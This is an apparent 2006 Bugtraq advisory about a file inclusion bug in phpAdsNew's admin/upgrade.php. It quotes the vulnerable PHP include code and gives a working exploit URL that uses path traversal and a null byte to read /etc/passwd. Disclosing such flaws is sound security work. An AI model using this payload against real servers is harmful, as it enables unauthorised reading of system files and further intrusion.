
Date: 17 Oct 2006 18:02:00 -0000
From: wacky@...ck.pl
To: bugtraq@...urityfocus.com
Subject: phpAdsNew include bug!


#######################################
Autors:
- Micha&#322; `wacky` B&#322;aszczak
- Nobody

http://iHACK.pl
#######################################
File: modules/phpads/admin/upgrade.php



Code:

// Load language strings
if (file_exists("../language/".$phpAds_config['language']."/default.lang.php"))
include("../language/".$phpAds_config['language']."/default.lang.php");
else
{
$phpAds_config['language'] = 'english';
include("../language/english/default.lang.php");
}



Exploit:

http://ihack.pl/phpAdsNew-2.0.8/admin/
upgrade.php?phpAds_config[language]=../../../etc/passwd%00
